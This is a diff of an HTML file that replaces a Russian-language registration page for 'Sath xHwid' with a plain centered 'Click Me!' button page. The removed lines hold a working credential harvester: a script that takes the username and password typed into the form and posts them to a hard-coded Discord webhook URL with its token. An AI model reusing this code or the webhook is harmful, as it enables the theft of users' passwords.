@@ -1,73 +1,36 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Регистрация Sath xHwid</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Centered Rounded Button with Image Background</title>
     <style>
-         body {
-            font-family: Arial, sans-serif;
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
             background-color: #f0f0f0;
-            padding: 50px;
         }
-        form {
-            background-color: #ffffff;
-            padding: 20px;
-            border-radius: 5px;
-            box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.1);
-        }
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-        }
-        input[type="submit"] {
-            background-color: #4CAF50;
+        .rounded-button {
+            padding: 15px 30px;
+            background: url('https://example.com/your-image.png') no-repeat center center;
+            background-size: cover;
             color: white;
-            padding: 10px 20px;
             border: none;
-            border-radius: 5px;
+            border-radius: 25px;
+            font-size: 16px;
             cursor: pointer;
+            transition: opacity 0.3s;
+            opacity: 0.9;
         }
-        input[type="submit"]:hover {
-            background-color: #45a049;
+        .rounded-button:hover {
+            opacity: 1;
         }
     </style>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 </head>
 <body>
-    <h2>Регистрация</h2>
-    <form id="registrationForm">
-        <label for="username">Имя пользователя:</label><br>
-        <input type="text" id="username" name="username"><br>
-        <label for="password">Пароль:</label><br>
-        <input type="password" id="password" name="password"><br>
-        <input type="submit" value="Зарегистрироваться">
-    </form>
-
-    <script>
-        $('#registrationForm').on('submit', function(e) {
-            e.preventDefault();
-            var username = $('#username').val();
-            var password = $('#password').val();
-
-            
-            var webhookUrl = 'https://discord.com/api/webhooks/1240014187904766004/fvPErv-6FaCSG9AhtpNHGrpLgkWfX1zEOf8rYzT23XPmS9-OfuJMglkqURa3sPchV2en';
-
-            var message = 'Ник: ' + username + ', Пароль: ' + password + '!';
-            $.ajax({
-                url: webhookUrl,
-                type: 'POST',
-                contentType: 'application/json',
-                data: JSON.stringify({content: message}),
-                success: function(response) {
-                    console.log('Сообщение успешно отправлено');
-                },
-                error: function(error) {
-                    console.error('Ошибка отправки сообщения на вебхук:', error);
-                }
-            });
-        });
-    </script>
+    <button class="rounded-button">Click Me!</button>
 </body>
 </html>
